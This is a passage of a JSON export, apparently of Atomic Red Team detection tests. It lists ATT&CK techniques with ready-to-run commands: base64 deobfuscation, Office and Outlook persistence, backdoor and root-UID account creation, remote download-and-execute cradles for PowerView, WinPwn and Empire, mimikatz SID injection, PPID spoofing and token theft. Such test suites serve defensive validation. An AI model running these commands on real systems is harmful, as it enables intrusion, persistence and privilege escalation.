"ENCODED=$(echo '#{message}' | base64)\nprintf $ENCODED | base64 -d\necho $ENCODED | base64 -d\necho $(echo $ENCODED) | base64 -d\necho $ENCODED > #{encoded_file} && base64 -d #{encoded_file}\necho $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d\nbash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm60b02z429mqaasj364p"], "tags": []}, {"data": {"name": "Base64 decoding with Python", "shortName": "T1140", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use Python to decode a base64-encoded text string and echo it to the console\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | message | Message to print to the screen | String | Hello from Atomic Red Team test T1140! | \n | encoded_file | File to temporarily save encoded text | Path | /tmp/T1140.encoded | "}, "executionSteps": [{"description": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"#{message}\".encode());print(enc.decode())')\npython3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"\necho $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"\necho $ENCODED > #{encoded_file} && python3 -c \"import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())\"\n", "successCriteria": null}], "techniqueIds": ["clacwm60b02z429mqaasj364p"], "tags": []}, {"data": {"name": "Base64 decoding with Perl", "shortName": "T1140", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use Perl to decode a base64-encoded text string and echo it to the console\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | message | Message to print to the screen | String | Hello from Atomic Red Team test T1140! | \n | encoded_file | File to temporarily save encoded text | Path | /tmp/T1140.encoded | "}, "executionSteps": [{"description": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('#{message}'));\")\nperl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"\necho $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'\necho $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,\"<\",\"#{encoded_file}\");print(decode_base64(<$f>));'\n", "successCriteria": null}], "techniqueIds": ["clacwm60b02z429mqaasj364p"], "tags": []}, {"data": {"name": "Code Executed Via Excel Add-in File (Xll)", "shortName": "T1137.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Downloads a XLL file and loads it using the excel add-ins library.\nThis causes excel to display the message \"Hello World\"\nSource of XLL - https://github.com/edparcell/HelloWorldXll \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xll_url | url of the file HelloWorldXll.xll | Url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/HelloWorldXll.xll | \n | local_file | name of the xll file | Path | $env:tmp\\HelloWorldXll.xll | "}, "executionSteps": [{"description": "powershell -c \"iwr -URI '#{xll_url}' -o '#{local_file}'; IEX ((new-object -ComObject excel.application).RegisterXLL('$env:tmp\\HelloWorldXll.xll'))\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5yr02xg29mqbbxz5s2t"], "tags": []}, {"data": {"name": "Install Outlook Home Page Persistence", "shortName": "T1137.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url | URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://) | String | file://PathToAtomicsFolder\\T1137.004\\src\\T1137.004.html | \n | outlook_version | Version of Outlook that is installed | String | 16 | \n | outlook_folder | Name of the Outlook folder to modify the homepage setting for | String | Inbox | "}, "executionSteps": [{"description": "reg.exe add HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6l403l229mqgodr9t6h", "clacwm27900mq29mqd521hmbp"], "tags": []}, {"data": {"name": "Office Application Startup Test Persistence", "shortName": "T1137.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | thing_to_execute | Thing to Run | Path | C:\\Path\\AtomicRedTeam.dll | "}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"#{thing_to_execute}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6s903ti29mq0heic4gw", "clacwm26y00mk29mq54bn9cgv"], "tags": []}, {"data": {"name": "Office Application Startup - Outlook as a C2", "shortName": "T1137", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f\nmkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1\necho \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM\n", "successCriteria": null}], "techniqueIds": ["clacwm5wi02vj29mq6xw54mtf", "clacwm26t00mg29mq5jxifaop"], "tags": []}, {"data": {"name": "AWS - Create a new IAM user", "shortName": "T1136.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the IAM user to create in AWS | String | atomicredteam | "}, "executionSteps": [{"description": "aws iam create-user --user-name #{username}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ga03fz29mq1ogybqwk"], "tags": []}, {"data": {"name": "Create a new Windows domain admin user", "shortName": "T1136.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new domain admin user in a command prompt.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | T1136.002_Admin | \n | password | Password of the user to create | String | T1136_pass123! | \n | group | Domain administrator group to which add the user to | String | Domain Admins | "}, "executionSteps": [{"description": "net user \"#{username}\" \"#{password}\" /add /domain\nnet group \"#{group}\" \"#{username}\" /add /domain\n", "successCriteria": null}], "techniqueIds": ["clacwm6a3038z29mq77r33osx", "clacwm1p200ai29mqdmp90uor"], "tags": []}, {"data": {"name": "Create a new Domain Account using PowerShell", "shortName": "T1136.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new Domain User using the credentials of the Current User\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Name of the Account to be created | String | T1136.002_Admin | \n | password | Password of the Account to be created | String | T1136_pass123! | "}, "executionSteps": [{"description": "$SamAccountName = '#{username}'\n$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n", "successCriteria": null}], "techniqueIds": ["clacwm6a3038z29mq77r33osx", "clacwm1p200ai29mqdmp90uor"], "tags": []}, {"data": {"name": "Create a new account similar to ANONYMOUS LOGON", "shortName": "T1136.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | ANONYMOUS  LOGON | \n | password | Password of the user to create | String | T1136_pass123! | "}, "executionSteps": [{"description": "net user \"#{username}\" \"#{password}\" /add /domain\n", "successCriteria": null}], "techniqueIds": ["clacwm6a3038z29mq77r33osx", "clacwm1p200ai29mqdmp90uor"], "tags": []}, {"data": {"name": "Create a user account on a MacOS system", "shortName": "T1136.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a user on a MacOS system with dscl\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | evil_user | \n | realname | 'realname' to record when creating the user | String | Evil Account | "}, "executionSteps": [{"description": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/zsh\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n", "successCriteria": null}], "techniqueIds": ["clacwm66u035k29mqcyhy1lsd", "clacwm22100iw29mqcsph02de"], "tags": []}, {"data": {"name": "Create a user account on a Linux system", "shortName": "T1136.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a user via useradd\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | evil_user | "}, "executionSteps": [{"description": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n", "successCriteria": null}], "techniqueIds": ["clacwm66u035k29mqcyhy1lsd", "clacwm22100iw29mqcsph02de"], "tags": []}, {"data": {"name": "Create a new Windows admin user", "shortName": "T1136.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new admin user in a command prompt.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | T1136.001_Admin | \n | password | Password of the user to create | String | T1136_pass | "}, "executionSteps": [{"description": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n", "successCriteria": null}], "techniqueIds": ["clacwm66u035k29mqcyhy1lsd", "clacwm22100iw29mqcsph02de"], "tags": []}, {"data": {"name": "Create a new user in PowerShell", "shortName": "T1136.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | T1136.001_PowerShell | "}, "executionSteps": [{"description": "New-LocalUser -Name \"#{username}\" -NoPassword\n", "successCriteria": null}], "techniqueIds": ["clacwm66u035k29mqcyhy1lsd", "clacwm22100iw29mqcsph02de"], "tags": []}, {"data": {"name": "Create a new user in Linux with `root` UID and GID.", "shortName": "T1136.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | butter | \n | password | Password of the user to create | String | BetterWithButter | "}, "executionSteps": [{"description": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;\n", "successCriteria": null}], "techniqueIds": ["clacwm66u035k29mqcyhy1lsd", "clacwm22100iw29mqcsph02de"], "tags": []}, {"data": {"name": "Create a new user in a command prompt", "shortName": "T1136.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of the user to create | String | T1136.001_CMD | \n | password | Password of the user to create | String | T1136.001_CMD! | "}, "executionSteps": [{"description": "net user /add \"#{username}\" \"#{password}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm66u035k29mqcyhy1lsd", "clacwm22100iw29mqcsph02de"], "tags": []}, {"data": {"name": "WinPwn - shareenumeration", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Network share enumeration using the shareenumeration function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2"], "tags": []}, {"data": {"name": "View available share drives", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net share\n", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2", "clacwm25s00lr29mq0a0kfryz"], "tags": []}, {"data": {"name": "Share Discovery with PowerView", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2", "clacwm25s00lr29mq0a0kfryz"], "tags": []}, {"data": {"name": "PowerView ShareFinder", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | parameters | ShareFinder parameter | String | -CheckShareAccess | "}, "executionSteps": [{"description": "Import-Module $env:TEMP\\PowerView.ps1\nInvoke-ShareFinder #{parameters}\n", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2"], "tags": []}, {"data": {"name": "Network Share Discovery PowerShell", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "get-smbshare\n", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2", "clacwm25s00lr29mq0a0kfryz"], "tags": []}, {"data": {"name": "Network Share Discovery command prompt", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | computer_name | Computer name to find a mount on. | String | localhost | "}, "executionSteps": [{"description": "net view \\\\#{computer_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2", "clacwm25s00lr29mq0a0kfryz"], "tags": []}, {"data": {"name": "Network Share Discovery - linux", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Network Share Discovery using smbstatus\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | package_checker | Package checking command. Debian - dpkg -s samba | String | (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed) | \n | package_installer | Package installer command. Debian - apt install samba | String | (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba) | "}, "executionSteps": [{"description": "sudo smbstatus --shares\n", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2"], "tags": []}, {"data": {"name": "Network Share Discovery", "shortName": "T1135", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Network Share Discovery\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | computer_name | Computer name to find a mount on. | String | computer1 | "}, "executionSteps": [{"description": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5yh02x629mq6zmt8oa2", "clacwm25s00lr29mq0a0kfryz"], "tags": []}, {"data": {"name": "Injection SID-History with mimikatz", "shortName": "T1134.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | sid_to_inject | SID to inject into sidhistory | String | S-1-5-21-1004336348-1177238915-682003330-1134 | \n | sam_account_name | Target account to modify | String | $env:username | \n | mimikatz_path | Mimikatz windows executable | Path | $env:TEMP\\mimikatz\\x64\\mimikatz.exe | "}, "executionSteps": [{"description": "#{mimikatz_path} \"privilege::debug\" \"sid::patch\" \"sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}\" \"exit\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6jf03jj29mq9s6e6dqm"], "tags": []}, {"data": {"name": "Parent PID Spoofing using PowerShell", "shortName": "T1134.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | parent_process_name | Name of the parent process | String | explorer | \n | spawnto_process_path | Path of the process to spawn | Path | C:\\Program Files\\Internet Explorer\\iexplore.exe | \n | dll_process_name | Name of the created process from the injected dll | String | calculator | \n | dll_path | Path of the dll to inject | Path | PathToAtomicsFolder\\T1134.004\\bin\\calc.dll | \n | spawnto_process_name | Name of the process to spawn | String | iexplore | "}, "executionSteps": [{"description": ". $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6ez03e929mq22906e2x", "clacwm27f00mu29mq0vlv6fpw"], "tags": []}, {"data": {"name": "Parent PID Spoofing - Spawn from svchost.exe", "shortName": "T1134.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Spawnd a process as a child of the first accessible svchost.exe process.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_line | Specified command line to use | String | -Command Start-Sleep 10 | \n | file_path | File path or name of process to spawn | Path | $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | "}, "executionSteps": [{"description": "Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'", "successCriteria": null}], "techniqueIds": ["clacwm6ez03e929mq22906e2x", "clacwm27f00mu29mq0vlv6fpw"], "tags": []}, {"data": {"name": "Parent PID Spoofing - Spawn from Specified Process", "shortName": "T1134.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Spawns a notepad.exe process as a child of the current process.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | parent_pid | PID of process to spawn from | String | $PID | \n | test_guid | Defined test GUID | String | 12345678-1234-1234-1234-123456789123 | "}, "executionSteps": [{"description": "Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}", "successCriteria": null}], "techniqueIds": ["clacwm6ez03e929mq22906e2x", "clacwm27f00mu29mq0vlv6fpw"], "tags": []}, {"data": {"name": "Parent PID Spoofing - Spawn from New Process", "shortName": "T1134.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_line | Specified command line to use | String | -Command Start-Sleep 10 | \n | file_path | File path or name of process to spawn | Path | $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | \n | parent_name | Parent process to spoof from | Path | $Env:windir\\System32\\notepad.exe | "}, "executionSteps": [{"description": "Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'", "successCriteria": null}], "techniqueIds": ["clacwm6ez03e929mq22906e2x", "clacwm27f00mu29mq0vlv6fpw"], "tags": []}, {"data": {"name": "Parent PID Spoofing - Spawn from Current Process", "shortName": "T1134.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Spawns a powershell.exe process as a child of the current process.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | File path or name of process to spawn | Path | $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | \n | parent_pid | PID of process to spawn from | String | $PID | \n | command_line | Specified command line to use | String | -Command Start-Sleep 10 | "}, "executionSteps": [{"description": "Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}", "successCriteria": null}], "techniqueIds": ["clacwm6ez03e929mq22906e2x", "clacwm27f00mu29mq0vlv6fpw"], "tags": []}, {"data": {"name": "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique", "shortName": "T1134.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem", "successCriteria": null}], "techniqueIds": ["clacwm67o036f29mq1zch53o6"], "tags": []}, {"data": {"name": "Access Token Manipulation", "shortName": "T1134.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n", "successCriteria": null}], "techniqueIds": ["clacwm67o036f29mq1zch53o6"], "tags": []}, {"data": {"name": "Named pipe client impersonation", "shortName": "T1134.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6dk03cn29mq0frjeyj6", "clacwm2jg00xg29mq215y9ue8"], "tags": []}, {"data": {"name": "Launch NSudo Executable", "shortName": "T1134.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | nsudo_path | Path to the NSudo bat file | Path | $env:TEMP\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe | "}, "executionSteps": [{"description": "Start-Process #{nsudo_path} -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n", "successCriteria": null}], "techniqueIds": ["clacwm6dk03cn29mq0frjeyj6"], "tags": []}, {"data": {"name": "Bad Potato", "shortName": "T1134.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "cd $env:temp\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n", "successCriteria": null}], "techniqueIds": ["clacwm6dk03cn29mq0frjeyj6"], "tags": []}, {"data": {"name": "`SeDebugPrivilege` token duplication", "shortName": "T1134.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6dk03cn29mq0frjeyj6", "clacwm2jg00xg29mq215y9ue8"], "tags": []}, {"data": {"name": "Running Chrome VPN Extensions via the Registry 2 vpn extension", "shortName": "T1133", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Running Chrome VPN Extensions via the Registry install 2 vpn 